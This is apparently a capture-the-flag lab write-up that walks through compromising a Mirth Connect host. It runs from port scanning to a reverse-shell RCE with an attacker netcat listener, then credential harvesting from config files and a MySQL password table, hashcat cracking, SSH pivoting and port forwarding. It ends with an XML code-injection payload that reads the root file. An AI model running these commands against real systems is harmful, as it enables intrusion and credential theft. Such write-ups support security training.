# Findings & Methodology

## 1. Initial Enumeration

**Goal:** Identify exposed services

```bash
sudo nmap <TARGET_IP> -p- -sV -sC
```

**Findings:**

* 22 → SSH
* 80/443 → Mirth Connect (Jetty)
* 6661 → Unknown service

---

## 2. Web Enumeration

**Goal:** Investigate web application

```bash
whatweb http://<TARGET_IP>
curl -I http://<TARGET_IP>
```

**Findings:**

* Mirth Connect Administrator panel identified
* Potential enterprise application attack surface

---

## 3. Initial Foothold (RCE)

**Goal:** Gain shell access via vulnerable web application (Mirth Connect)

```bash
python3 mirthconnect_exploit.py -t <TARGET_IP> -p 443 -lh <YOUR_IP> -lp 4445 --exploit
```
Listener (attacker machine):

nc -lvnp 4445

**Result:**

*Reverse shell received on attacker machine
*Initial access obtained as mirth user

---

## 4. Shell Stabilization

**Goal:** Improve shell usability

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 5. Local Enumeration

**Goal:** Discover credentials & configs

```bash
whoami
id
ls -la
ss -tlnp
```

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
grep -Ri "password" /usr/local/mirthconnect
```

**Findings:**

* Database credentials discovered

---

## 6. Database Access

**Goal:** Extract user data

```bash
mysql -u <DB_USER> -p<DB_PASS> <DB_NAME>
```

```sql
show tables;
select * from PERSON;
select * from PERSON_PASSWORD;
```

**Findings:**

* User `sedric`
* Password hash retrieved

---

## 7. Hash Processing & Cracking

**Goal:** Recover plaintext password

```bash
echo '<BASE64_HASH>' > hash.txt
base64 -d hash.txt | xxd -p -c 256 > hash_hex.txt
```

```bash
hashcat -m 10900 hash_pbkdf2.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

* Password recovered

---

## 8. Lateral Movement (SSH)

**Goal:** Access user account

```bash
ssh sedric@<TARGET_IP>
```

---

## 9. Internal Service Discovery

**Goal:** Identify hidden services

```bash
ss -tlnp
```

**Findings:**

* Internal service on 127.0.0.1:54321

---

## 10. Port Forwarding

**Goal:** Access internal service externally

```bash
ssh -L 54321:127.0.0.1:54321 sedric@<TARGET_IP>
```

---

## 11. Web Exploitation (Internal App)

**Goal:** Test for injection

```bash
python3 - << 'EOF'
import requests
requests.post("http://127.0.0.1:54321/addPatient", data="<xml>")
EOF
```

**Findings:**

* Input interpreted dynamically (code execution possible)

---

## 12. Privilege Escalation

**Goal:** Execute commands as root

```bash
python3 - << 'EOF'
import requests
xml = "<patient><firstname>{open('/root/root.txt').read()}</firstname></patient>"
requests.post("http://127.0.0.1:54321/addPatient", data=xml)
EOF
```

**Result:**

* Root-level access confirmed

---

## Key Takeaways

* Enumeration is critical for identifying attack paths
* Misconfigured applications expose credentials
* Hash analysis & cracking enable lateral movement
* Internal services expand attack surface
* Application-layer flaws can lead to full system compromise

---
